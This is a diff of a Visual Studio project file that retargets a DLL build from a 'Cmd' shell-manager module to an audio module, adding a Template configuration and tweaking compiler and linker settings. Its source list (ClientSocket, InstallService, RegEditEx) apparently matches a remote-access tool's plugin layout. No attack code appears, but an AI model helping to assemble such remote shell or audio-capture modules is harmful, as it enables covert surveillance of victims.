@@ -5,14 +5,22 @@
       <Configuration>Release</Configuration>
       <Platform>Win32</Platform>
     </ProjectConfiguration>
+    <ProjectConfiguration Include="Template|Win32">
+      <Configuration>Template</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
   </ItemGroup>
   <PropertyGroup Label="Globals">
     <SccProjectName />
     <SccLocalPath />
-    <ProjectGuid>{10718CDE-362D-474B-B4BE-CFFE25F34217}</ProjectGuid>
+    <ProjectGuid>{C98D753F-153E-46A0-B5BA-60C61E8A9FC0}</ProjectGuid>
     <WindowsTargetPlatformVersion>10.0.15063.0</WindowsTargetPlatformVersion>
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Template|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <PlatformToolset>v141</PlatformToolset>
+  </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
     <ConfigurationType>DynamicLibrary</ConfigurationType>
     <PlatformToolset>v141</PlatformToolset>
@@ -21,6 +29,9 @@
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
   <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Template|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
   </ImportGroup>
   <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="PropertySheets">
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
@@ -32,22 +43,27 @@
     <CodeAnalysisRules />
     <CodeAnalysisRuleAssemblies />
   </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Template|Win32'">
+    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
+    <CodeAnalysisRules />
+    <CodeAnalysisRuleAssemblies />
+  </PropertyGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
     <ClCompile>
       <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <InlineFunctionExpansion>Default</InlineFunctionExpansion>
+      <StringPooling>true</StringPooling>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
       <Optimization>MaxSpeed</Optimization>
       <SuppressStartupBanner>true</SuppressStartupBanner>
-      <WarningLevel>Level3</WarningLevel>
       <AdditionalIncludeDirectories>../../common/;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
       <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;_MBCS;UNICODE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
-      <InlineFunctionExpansion>Default</InlineFunctionExpansion>
-      <FavorSizeOrSpeed>Speed</FavorSizeOrSpeed>
       <PrecompiledHeader>Use</PrecompiledHeader>
     </ClCompile>
     <Midl>
       <SuppressStartupBanner>true</SuppressStartupBanner>
       <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
-      <TypeLibraryName>.\../Release\Cmd.tlb</TypeLibraryName>
+      <TypeLibraryName>.\../Release\MyAudio.tlb</TypeLibraryName>
       <MkTypLibCompatible>true</MkTypLibCompatible>
       <TargetEnvironment>Win32</TargetEnvironment>
     </Midl>
@@ -57,32 +73,33 @@
     </ResourceCompile>
     <Bscmake>
       <SuppressStartupBanner>true</SuppressStartupBanner>
-      <OutputFile>.\../Release\Cmd.bsc</OutputFile>
+      <OutputFile>.\../Release\MyAudio.bsc</OutputFile>
     </Bscmake>
     <Link>
       <LinkDLL>true</LinkDLL>
       <SubSystem>Windows</SubSystem>
-      <OutputFile>../Cmd.dll</OutputFile>
+      <OutputFile>../Audio.dll</OutputFile>
       <AdditionalOptions> /ignore:4098</AdditionalOptions>
-      <OptimizeReferences>true</OptimizeReferences>
-      <EnableCOMDATFolding>true</EnableCOMDATFolding>
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
+    <ClCompile Include="..\..\common\Audio.cpp" />
     <ClCompile Include="..\..\common\Buffer.cpp" />
     <ClCompile Include="..\..\common\ClientSocket.cpp" />
     <ClCompile Include="..\..\common\InstallService.cpp" />
     <ClCompile Include="..\..\common\Manager.cpp" />
     <ClCompile Include="..\..\common\minilzo.cpp" />
+    <ClCompile Include="..\..\common\myCrt.cpp" />
     <ClCompile Include="..\..\common\RegEditEx.cpp" />
     <ClCompile Include="..\..\common\until.cpp" />
-    <ClCompile Include="Cmd.cpp" />
-    <ClCompile Include="MyShellManager.cpp" />
+    <ClCompile Include="MyAudio.cpp" />
+    <ClCompile Include="MyAudioManager.cpp" />
     <ClCompile Include="StdAfx.cpp">
       <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
     </ClCompile>
   </ItemGroup>
   <ItemGroup>
+    <ClInclude Include="..\..\common\Audio.h" />
     <ClInclude Include="..\..\common\Buffer.h" />
     <ClInclude Include="..\..\common\ClientSocket.h" />
     <ClInclude Include="..\..\common\InstallService.h" />
@@ -90,7 +107,7 @@
     <ClInclude Include="..\..\common\Manager.h" />
     <ClInclude Include="..\..\common\RegEditEx.h" />
     <ClInclude Include="..\..\common\until.h" />
-    <ClInclude Include="MyShellManager.h" />
+    <ClInclude Include="MyAudioManager.h" />
     <ClInclude Include="StdAfx.h" />
   </ItemGroup>
   <ItemGroup>
